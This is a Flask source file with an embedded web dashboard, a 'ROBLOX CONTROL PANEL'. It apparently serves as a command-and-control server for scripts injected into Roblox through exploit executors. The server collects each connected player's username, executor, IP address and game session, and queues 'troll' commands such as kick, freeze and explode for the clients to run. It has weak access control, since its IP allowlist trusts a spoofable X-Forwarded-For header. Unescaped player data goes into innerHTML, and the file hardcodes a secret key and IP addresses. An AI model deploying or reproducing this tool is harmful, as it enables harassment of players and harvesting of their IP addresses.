from flask import Flask, request, jsonify, render_template_string, abort
from flask_socketio import SocketIO
import time
import eventlet

eventlet.monkey_patch()

app = Flask(__name__)
app.config["SECRET_KEY"] = "super_secret_key_change_me_123456"
socketio = SocketIO(app, cors_allowed_origins="*", async_mode="eventlet")

ALLOWED_IPS = {"37.66.149.36", "91.170.86.224"}

connected_players = {}
pending_kicks = {}
pending_commands = {}

def check_ip():
    ip = request.headers.get("X-Forwarded-For", request.remote_addr)
    if ip and "," in ip:
        ip = ip.split(",")[0].strip()
    if ip not in ALLOWED_IPS:
        abort(403)

@app.errorhandler(403)
def access_denied(e):
    detected = request.headers.get("X-Forwarded-For", request.remote_addr)
    if detected and "," in detected:
        detected = detected.split(",")[0].strip()
    return f"""
    <html>
      <body style="background:#000;color:#ff3366;font-family:Arial;text-align:center;padding-top:15%;">
        <h1>Accès refusé</h1>
        <p>Ta crue quoi fdp ?</p>
        <p>Ton IP : <b>{detected}</b></p>
      </body>
    </html>
    """, 403

@app.before_request
def protect_routes():
    if request.path in ["/", "/kick", "/troll"]:
        check_ip()

HTML = """<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<title>ROBLOX CONTROL PANEL</title>
<script src="https://cdn.socket.io/4.7.5/socket.io.min.js"></script>
<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@600&family=Inter:wght@400;600&display=swap" rel="stylesheet">
<style>
*{box-sizing:border-box;margin:0;padding:0}
body{font-family:Inter,sans-serif;background:radial-gradient(circle at top,#0f2027,#000);color:#fff;min-height:100vh}
.container{max-width:1200px;margin:auto;padding:40px}
h1{font-family:Orbitron;font-size:3.5rem;text-align:center;color:#00ffaa;text-shadow:0 0 30px #00ffaa;margin-bottom:20px}
.stats{text-align:center;margin:30px 0;font-size:1.8rem}
.grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(360px,1fr));gap:25px}
.card{background:rgba(20,20,20,.9);border-radius:18px;padding:25px;box-shadow:0 0 30px rgba(0,0,0,.7);transition:transform .3s}
.card:hover{transform:translateY(-8px)}
.status{display:flex;align-items:center;gap:10px;margin-bottom:15px}
.dot{width:14px;height:14px;border-radius:50%;background:red;box-shadow:0 0 12px red}
.dot.online{background:#00ffaa;box-shadow:0 0 18px #00ffaa}
.name{font-size:1.8rem;font-weight:600;color:#ffcc00;margin-bottom:10px}
.name a{color:#ffcc00;text-decoration:none}
.name a:hover{text-decoration:underline}
.info{font-size:1rem;color:#aaa;margin-bottom:20px;line-height:1.5}
.category{font-weight:bold;color:#00ffaa;margin:15px 0 10px;font-size:1.1rem}
button.kick-btn{padding:12px;border:none;border-radius:12px;cursor:pointer;font-weight:bold;font-size:0.95rem;color:white;transition:transform .2s;margin-bottom:8px}
button.kick-btn:hover{transform:scale(1.05)}
button.kick-btn:disabled{background:#444 !important;cursor:not-allowed;transform:none}
.modal{display:none;position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.8);align-items:center;justify-content:center;z-index:1000}
.modal.active{display:flex}
.modal-content{background:#111;padding:30px;border-radius:20px;width:90%;max-width:500px;box-shadow:0 0 40px rgba(255,51,102,0.5)}
.modal-content h2{text-align:center;color:#ff3366;margin-bottom:20px}
.modal-content input{width:100%;padding:15px;border-radius:12px;border:none;background:#222;color:white;font-size:1.1rem;margin-bottom:20px}
.modal-buttons{display:flex;gap:15px}
.modal-buttons button{flex:1;padding:14px;border:none;border-radius:12px;font-weight:bold;cursor:pointer}
.confirm-btn{background:linear-gradient(45deg,#ff3366,#ff5588);color:white}
.cancel-btn{background:#444;color:white}
.toast-container{position:fixed;bottom:25px;right:25px;z-index:999}
.toast{background:#111;border-left:5px solid #00ffaa;padding:15px 20px;margin-top:12px;border-radius:10px;box-shadow:0 0 15px rgba(0,0,0,0.6)}
.toast.danger{border-color:#ff3366}
</style>
</head>
<body>
<div class="container">
    <h1>ROBLOX CONTROL PANEL</h1>
    <div class="stats" id="stats">Players online: <b>0</b></div>
    <div class="grid" id="players"></div>
</div>

<div class="modal" id="kickModal">
    <div class="modal-content">
        <h2>Kick Player</h2>
        <input type="text" id="kickReason" placeholder="Reason (optional)" autofocus>
        <div class="modal-buttons">
            <button class="cancel-btn" id="cancelKick">Cancel</button>
            <button class="confirm-btn" id="confirmKick">Confirm</button>
        </div>
    </div>
</div>
<div class="toast-container" id="toasts"></div>

<script>
const socket = io();
let currentKickId = null;
const kickModal = document.getElementById("kickModal");

function toast(msg, type = "success") {
    const t = document.createElement("div");
    t.className = "toast " + (type === "danger" ? "danger" : "");
    t.textContent = msg;
    document.getElementById("toasts").appendChild(t);
    setTimeout(() => t.remove(), 5000);
}

function openKickModal(id) { currentKickId = id; kickModal.classList.add("active"); document.getElementById("kickReason").focus(); }
function closeModal() { kickModal.classList.remove("active"); }

function performKick() {
    if (!currentKickId) return;
    const reason = document.getElementById("kickReason").value.trim() || "Kicked by admin";
    fetch("/kick", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: currentKickId, reason: reason})});
    toast(`Kick sent`, "danger");
    closeModal();
}

function sendTroll(id, cmd) {
    fetch("/troll", {method: "POST", headers: {"Content-Type": "application/json"}, body: JSON.stringify({userid: id, cmd: cmd})});
    toast(`${cmd.toUpperCase()} sent`, "danger");
}

function render(data) {
    document.getElementById("stats").innerHTML = `Players online: <b>${data.online}</b> / ${data.total}`;
    const grid = document.getElementById("players");
    const currentIds = new Set(Object.keys(data.players));
    
    Object.entries(data.players).forEach(([id, p]) => {
        let card = document.getElementById(`card_${id}`);
        if (!card) { card = document.createElement("div"); card.className = "card"; card.id = `card_${id}`; grid.appendChild(card); }
        card.innerHTML = `
            <div class="status"><div class="dot ${p.online ? "online" : ""}"></div><span>${p.online ? "Online" : "Offline"}</span></div>
            <div class="name"><a href="https://www.roblox.com/users/${id}/profile" target="_blank">${p.username}</a> (ID ${id})</div>
            <div class="info">Executor: ${p.executor}<br>IP: ${p.ip}<br>
            Game: <a href="https://www.roblox.com/fr/games/${p.gameId}" target="_blank">${p.game}</a><br>
            JobId: ${p.jobId}</div>
            <div class="category">TROLLS</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff3366,#ff5588);" onclick="openKickModal('${id}')">KICK</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff00ff,#aa00aa);" onclick="sendTroll('${id}','freeze')">FREEZE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#00ffff,#00aaaa);" onclick="sendTroll('${id}','spin')">SPIN</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ffff00,#aaaa00);" onclick="sendTroll('${id}','jump')">JUMP</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#88ff88,#55aa55);" onclick="sendTroll('${id}','rainbow')">RAINBOW</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#ff5555,#aa0000);" onclick="sendTroll('${id}','explode')">EXPLODE</button>
                <button class="kick-btn" style="background:linear-gradient(45deg,#5555ff,#0000aa);" onclick="sendTroll('${id}','invisible')">INVISIBLE</button>
            </div>
            <div class="category">UNDO</div>
            <div style="display:grid;grid-template-columns:1fr 1fr;gap:8px;">
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unfreeze')">UNFREEZE</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unspin')">UNSPIN</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','unrainbow')">STOP RAINBOW</button>
                <button class="kick-btn" style="background:#666;" onclick="sendTroll('${id}','uninvisible')">UNINVISIBLE</button>
            </div>
        `;
    });
    
    document.querySelectorAll('.card').forEach(c => {
        if (!currentIds.has(c.id.replace('card_', ''))) c.remove();
    });
}

document.getElementById("cancelKick").onclick = closeModal;
document.getElementById("confirmKick").onclick = performKick;
kickModal.onclick = (e) => { if (e.target === kickModal) closeModal(); };

socket.on("update", render);
socket.on("kick_notice", d => toast(`${d.username} → ${d.reason}`, "danger"));
socket.on("status", d => toast(`${d.username} is now ${d.online ? "online" : "offline"}`));
</script>
</body>
</html>"""

@app.route("/")
def index():
    return render_template_string(HTML)

@app.route("/api", methods=["GET", "POST"])
def api():
    now = time.time()
    if request.method == "POST":
        try:
            d = request.get_json(silent=True) or {}
            uid = str(d["userid"])
            if d.get("action") == "register":
                connected_players[uid] = {
                    "username": d.get("username", "Unknown"),
                    "executor": d.get("executor", "Unknown"),
                    "ip": d.get("ip", "Unknown"),
                    "last": now,
                    "online": True,
                    "game": d.get("game", "Unknown"),
                    "gameId": d.get("gameId", 0),
                    "jobId": d.get("jobId", "Unknown")
                }
                socketio.emit("status", {"username": connected_players[uid]["username"], "online": True})
            elif d.get("action") == "heartbeat" and uid in connected_players:
                connected_players[uid]["last"] = now
        except: pass
        return jsonify({"ok": True})

    if request.method == "GET":
        uid = str(request.args.get("userid", ""))
        if not uid: return jsonify({})
        if uid in pending_kicks:
            reason = pending_kicks.pop(uid, "Kicked")
            return jsonify({"command": "kick", "reason": reason})
        if uid in pending_commands:
            cmd = pending_commands.pop(uid)
            return jsonify({"command": cmd})
        return jsonify({})

@app.route("/kick", methods=["POST"])
def kick():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    reason = data.get("reason", "No reason")
    pending_kicks[uid] = reason
    name = connected_players.get(uid, {}).get("username", "Unknown")
    socketio.emit("kick_notice", {"username": name, "reason": f"KICK: {reason}"})
    return jsonify({"sent": True})

@app.route("/troll", methods=["POST"])
def troll():
    check_ip()
    data = request.get_json() or {}
    uid = str(data.get("userid", ""))
    cmd = data.get("cmd", "")
    if uid and cmd:
        pending_commands[uid] = cmd
        name = connected_players.get(uid, {}).get("username", "Unknown")
        socketio.emit("kick_notice", {"username": name, "reason": cmd.upper()})
    return jsonify({"sent": True})

def broadcast_loop():
    while True:
        now = time.time()
        online = 0
        to_remove = []
        for uid, p in connected_players.items():
            if now - p["last"] > 30:
                to_remove.append(uid)
            else:
                p["online"] = now - p["last"] < 15
                if p["online"]: online += 1
        for uid in to_remove:
            username = connected_players.pop(uid, {}).get("username", "Unknown")
            socketio.emit("status", {"username": username, "online": False})
        socketio.emit("update", {"players": connected_players, "online": online, "total": len(connected_players)})
        socketio.sleep(2)

if __name__ == "__main__":
    socketio.start_background_task(broadcast_loop)
    socketio.run(app, host="0.0.0.0", port=5000)
